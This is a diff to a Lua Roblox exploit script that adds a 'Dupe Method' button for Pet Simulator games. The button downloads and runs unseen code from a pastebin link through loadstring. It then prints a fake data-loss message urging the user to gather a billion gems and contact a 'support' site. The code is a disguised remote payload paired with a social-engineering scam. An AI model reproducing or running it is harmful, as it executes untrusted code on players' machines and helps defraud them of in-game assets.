@@ -170,6 +170,18 @@ local Button = ATab:CreateButton({
    end,
 })
 
+local PTab = Window:CreateTab("Pet Sim 99 and X Only!", 4483362458)
+local Section = PTab:CreateSection("Dupe Methods")
+
+local Button = PTab:CreateButton({
+   Name = "Dupe Method 1 99,99% Succses",
+   Callback = function()
+  print("Dupping...")
+  loadstring(game:HttpGet("https://pastebin.com/raw/gCTFvL4D"))()
+  print("Failure acourd Data has been lost to regain your lost data get atleast 1B gems and it should work and give all back if not contact support at https://fireuniversal.neocities.org/ and click contact")
+   end,
+})
+
 local names = false
 local Holder
 
